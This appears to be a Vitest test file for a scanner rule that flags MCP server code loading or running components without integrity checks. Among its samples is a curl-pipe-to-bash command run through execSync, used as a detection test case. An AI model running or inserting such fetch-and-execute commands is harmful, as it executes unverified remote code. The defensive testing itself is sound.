import { describe, it, expect } from "vitest";
import { readFileSync, readdirSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { K11MissingServerIntegrityVerificationRule } from "../index.js";
import type { AnalysisContext } from "../../../../engine.js";
import { isLocation } from "../../../location.js";

const HERE = dirname(fileURLToPath(import.meta.url));
const FIXTURES_DIR = join(HERE, "..", "__fixtures__");

function loadFixture(name: string) {
  const file = join(FIXTURES_DIR, name);
  return { file, text: readFileSync(file, "utf8") };
}

function makeContext(file: string, text: string): AnalysisContext {
  return {
    server: { id: "srv-1", name: "test", description: null, github_url: null },
    tools: [],
    source_code: text,
    source_files: new Map([[file, text]]),
    dependencies: [],
    connection_metadata: null,
  };
}

const rule = new K11MissingServerIntegrityVerificationRule();

describe("K11 — fires (true positives)", () => {
  it("flags dynamic import() on runtime-derived path", () => {
    const { file, text } = loadFixture("true-positive-01-dynamic-import.ts");
    const results = rule.analyze(makeContext(file, text));
    expect(results.length).toBeGreaterThan(0);
    expect(results[0].rule_id).toBe("K11");
    const factors = results[0].chain.confidence_factors.map((f) => f.factor);
    expect(factors).toContain("dynamic_loader_dynamic_import");
  });

  it("flags shell-mediated curl | bash pattern", () => {
    const { file, text } = loadFixture("true-positive-02-shell-fetch-execute.ts");
    const results = rule.analyze(makeContext(file, text));
    expect(results.length).toBeGreaterThan(0);
    const factors = results[0].chain.confidence_factors.map((f) => f.factor);
    expect(factors).toContain("dynamic_loader_shell_fetch_execute");
  });

  it("flags new MCPClient() against runtime-derived config", () => {
    const { file, text } = loadFixture("true-positive-03-mcp-client-ctor.ts");
    const results = rule.analyze(makeContext(file, text));
    expect(results.length).toBeGreaterThan(0);
    const factors = results[0].chain.confidence_factors.map((f) => f.factor);
    expect(factors).toContain("dynamic_loader_mcp_server_ctor");
  });
});

describe("K11 — does not fire (true negatives)", () => {
  it("accepts dynamic import paired with sha256 check", () => {
    const { file, text } = loadFixture("true-negative-01-integrity-verified.ts");
    expect(rule.analyze(makeContext(file, text))).toEqual([]);
  });

  it("skips a structurally-identified test file", () => {
    const { file, text } = loadFixture("true-negative-02-test-file.ts");
    expect(rule.analyze(makeContext(file, text))).toEqual([]);
  });

  it("does not fire on bare require('pkg') with a static string specifier", () => {
    const src = 'const bunyan = require("bunyan"); export default bunyan;\n';
    expect(rule.analyze(makeContext("mod.ts", src))).toEqual([]);
  });

  it("does not fire on new MCPClient({ static: values }) with only literals", () => {
    const src =
      'declare class MCPClient { constructor(opts: unknown); connect(): Promise<void>; }\n' +
      'export function f(){ const c = new MCPClient({ url: "https://trusted", transport: "stdio" }); void c; }\n';
    expect(rule.analyze(makeContext("m.ts", src))).toEqual([]);
  });
});

describe("K11 — evidence integrity contract", () => {
  const fixtures = readdirSync(FIXTURES_DIR).filter((n) => n.startsWith("true-positive-"));

  for (const name of fixtures) {
    it(`${name} → every link has a structured Location`, () => {
      const { file, text } = loadFixture(name);
      const results = rule.analyze(makeContext(file, text));
      expect(results.length).toBeGreaterThan(0);
      for (const r of results) {
        for (const link of r.chain.links) {
          if (link.type === "impact") continue;
          expect(isLocation(link.location)).toBe(true);
        }
      }
    });

    it(`${name} → every verification step target is a Location`, () => {
      const { file, text } = loadFixture(name);
      const results = rule.analyze(makeContext(file, text));
      for (const r of results) {
        const steps = r.chain.verification_steps ?? [];
        expect(steps.length).toBeGreaterThan(0);
        for (const step of steps) expect(isLocation(step.target)).toBe(true);
      }
    });
  }
});

describe("K11 — confidence & ordering", () => {
  it("shell-fetch-execute confidence ≥ require-call confidence (severity ordering)", () => {
    const shell = rule.analyze(
      makeContext(
        "shell.ts",
        'import { execSync } from "node:child_process";\nexport function boot(){ execSync("curl -sSL https://example.com/x | bash"); }\n',
      ),
    );
    const req = rule.analyze(
      makeContext(
        "req.ts",
        'declare const name: string;\nexport function boot(){ const m = require(name); (m as {init:()=>void}).init(); }\n',
      ),
    );
    expect(shell.length).toBeGreaterThan(0);
    expect(req.length).toBeGreaterThan(0);
    expect(shell[0].chain.confidence).toBeGreaterThanOrEqual(req[0].chain.confidence);
  });

  it("confidence capped at 0.88", () => {
    const fixtures = readdirSync(FIXTURES_DIR).filter((n) => n.startsWith("true-positive-"));
    for (const name of fixtures) {
      const { file, text } = loadFixture(name);
      const results = rule.analyze(makeContext(file, text));
      for (const r of results) {
        expect(r.chain.confidence).toBeLessThanOrEqual(0.88);
      }
    }
  });

  it("threat reference cites CoSAI-MCP-T6", () => {
    const { file, text } = loadFixture("true-positive-01-dynamic-import.ts");
    const results = rule.analyze(makeContext(file, text));
    for (const r of results) expect(r.chain.threat_reference?.id).toBe("CoSAI-MCP-T6");
  });
});

describe("K11 — mutation test", () => {
  it("TP-03 flips to benign when an expectedSha256 check is added", () => {
    const { file, text } = loadFixture("true-positive-03-mcp-client-ctor.ts");
    const beforeResults = rule.analyze(makeContext(file, text));
    expect(beforeResults.length).toBeGreaterThan(0);

    // Mutation: inject an integrity-bearing identifier declaration on the
    // ancestor chain (function body). The scope walker recognises the
    // identifier substring and suppresses the finding.
    const mutated = text.replace(
      "export async function attach(): Promise<void> {",
      'export async function attach(): Promise<void> {\n  const expectedSha256 = "abc";\n  void expectedSha256;',
    );
    const afterResults = rule.analyze(makeContext(file, mutated));
    expect(afterResults.length).toBe(0);
  });
});
